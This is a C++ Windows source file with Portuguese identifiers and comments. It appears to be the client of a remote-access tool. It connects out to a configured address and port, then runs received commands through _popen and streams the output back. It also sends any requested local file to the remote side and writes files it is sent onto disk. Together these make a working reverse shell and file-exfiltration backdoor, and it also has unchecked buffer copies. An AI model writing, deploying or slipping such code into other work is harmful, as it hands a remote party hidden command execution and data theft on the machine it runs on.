
#include "base64.h"
#include "funcoes.h"
using namespace std;



int criarSoquete(int *soquete)
{
	//inicializando soquete
	WSAData wsaData;
	WORD DllVersion = MAKEWORD(2, 1);
	if (WSAStartup(DllVersion, &wsaData) != 0)
	{
		cout << "Erro Ao inicializar soquete";
		return(-1);
	}
	//conectando
	SOCKADDR_IN addr;
	int sizeofaddr = sizeof(addr);
	addr.sin_addr.s_addr = inet_addr(ENDERECO);
	addr.sin_port = htons(PORTA);
	addr.sin_family = AF_INET;

	SOCKET Connection = socket(AF_INET, SOCK_STREAM, NULL);
	if (connect(Connection, (SOCKADDR*)&addr, sizeofaddr) != 0)
	{
		cout << "Erro ao conectar soquete" << endl;
		return(-1);
	}
	cout << "conectado" << endl;
	*soquete = Connection;
	return 0;
}
//faz a copia para o buffer, retorna o inteiro correspondente, mas nao muda o valor do buffer para o novo endereço
int receber(int soquete, tmensagem *msg)
{

	char buffer[TAMANHO_BUFFER];
	//cout << "Esperando para receber" << endl;
	recv(soquete, buffer, TAMANHO_BUFFER, 0);
	
	//cout << "recebi!" << endl;
	memcpy((void *)(msg->buffer), (void *)(buffer + 5), TAMANHO_BUFFER - 5);
	msg->tamanhoMsg = *((unsigned int *)buffer);
	msg->opCode = buffer[4];

	if (msg->tamanhoMsg < TAMANHO_BUFFER - 5 )
	{
		msg->buffer[msg->tamanhoMsg] = '\0';
	}

	return WSAGetLastError();;
}

int enviar(int soquete, tmensagem *msg)
{
	//cout << "enviando " << endl;


	if (msg->tamanhoMsg < TAMANHO_BUFFER - 5)
	{
		msg->buffer[msg->tamanhoMsg] = '\0';
	}

	char buffer[TAMANHO_BUFFER];
	memcpy((void *)(buffer + 5), (void *)(msg->buffer), TAMANHO_BUFFER - 5);
	*((int *)buffer) = msg->tamanhoMsg;
	buffer[4] = msg->opCode;

	send(soquete, buffer, TAMANHO_BUFFER, 0);

	return 0;
}
void receberArquivo(int soquete, FILE *arquivoPtr, tmensagem *msg)
{
	size_t escritos;
	msg->opCode = tReceberArquivoSend;
	receber(soquete, msg);

	while (msg->opCode != tEOFReq)
	{
		//printf("%i\n",msg->opCode);
		fwrite(msg->buffer, 1, msg->tamanhoMsg, arquivoPtr);
		receber(soquete, msg);
	}
	fclose(arquivoPtr);
	printf("\nFIM DO ARQUIVO\n");
}
void enviarArquivo(int soquete, FILE *arquivoPtr, tmensagem *msg)
{
	size_t lidos;

	msg->opCode = tEnviarArquivoSend;
	while ((lidos = fread((void *)msg->buffer, 1, TAMANHO_BUFFER - 5, arquivoPtr)) > 0)
	{
		msg->tamanhoMsg = int(lidos);

		enviar(soquete, msg);
		//printf("%s:%i:%i\n", msg->buffer, msg->tamanhoMsg, msg->opCode);

	}
	char *string = "fim do arquivo";
	preencherStruct(msg, string, tEOFSend,strlen(string));
	//printf("2:%s:%i:%i\n", msg->buffer, msg->tamanhoMsg, msg->opCode);
	enviar(soquete, msg);
	fclose(arquivoPtr);
}
void rodarComando(int soquete, tmensagem *msg)
{
	FILE *fp;
	fp = _popen(msg->buffer, "r");
	if (!fp)
	{
		//FIXME, enviar codigo de erro de volta.
		printf("erro ao rodar comando: %s", strerror(errno));
	}
	else
	{
		enviarArquivo(soquete, fp,msg);
	}
	_pclose(fp);
	
}
int esperarComando(int soquete)
{

	tmensagem msg;
	FILE *arquivoPtr;
	int errorCode;
	unsigned packLoss=0;
	while (1)
	{

		if ((errorCode = receber(soquete, &msg)) != 0)
		{
			cout << "Erro ocorreu ao receber mensagem: " << errorCode << endl;
			return -1; 
		}
		switch (msg.opCode)
		{
		case(thelloReq):
			cout << "enviando arquivo" << " " << msg.buffer << endl;
			break;
		case(tEnviarArquivoReq): //baixar arquivo
			

			if (!(arquivoPtr = fopen(msg.buffer, "rb")))
			{
				char curr[1000];
				GetCurrentDir(curr, 1000);
				//printf("atual: %s", curr);

				//printf("Erro ao abrir arquivo, %s", strerror(errno));
				snprintf(msg.buffer, TAMANHO_BUFFER - 5, "%s : Erro ao abrir arquivo, %s", curr,strerror(errno));
				preencherStruct(&msg, msg.buffer, 2,0);
				//printf("2:%s:%i:%i\n", msg->buffer, msg->tamanhoMsg, msg->opCode);
				enviar(soquete, &msg);
			}
			else
			{
				enviarArquivo(soquete, arquivoPtr, &msg);
			}
			break;
		case(tReceberArquivoReq): //baixar arquivo
			cout << "recebendo arquivo" << " " << msg.buffer << endl;

			if (!(arquivoPtr = fopen(msg.buffer, "wb")))
			{
				char curr[1000];
				GetCurrentDir(curr, 1000);
				snprintf(msg.buffer, TAMANHO_BUFFER - 5, "%s : Erro ao abrir arquivo, %s", curr, strerror(errno));
				preencherStruct(&msg, msg.buffer, 2, 0);
				enviar(soquete, &msg);
			}
			else
			{
				receberArquivo(soquete, arquivoPtr, &msg);
			}
			break;
		case(trodarCodigoSend): //baixar arquivo
			cout << "rodando codigo" << " " << msg.buffer << endl;
			rodarComando(soquete, &msg);
			break;

		default:
			cout << "Ainda nao estou implementado, erro:"<<  endl;
			packLoss++;
			if (packLoss > 1000)
			{
				//throw "Erro perda de pacotes";
				return -1;

			}
				
			
		}
	}


	return 0;
}
void preencherStruct(tmensagem *msgPtr, const char *string, char opcode, int len)
{
	memcpy((void *)msgPtr->buffer, (void *)string, TAMANHO_BUFFER - 5);
	msgPtr->opCode = opcode;
	if (len == 0)
	{
		msgPtr->tamanhoMsg = strlen(string);
	}
	else
	{
		msgPtr->tamanhoMsg = len;
	}
}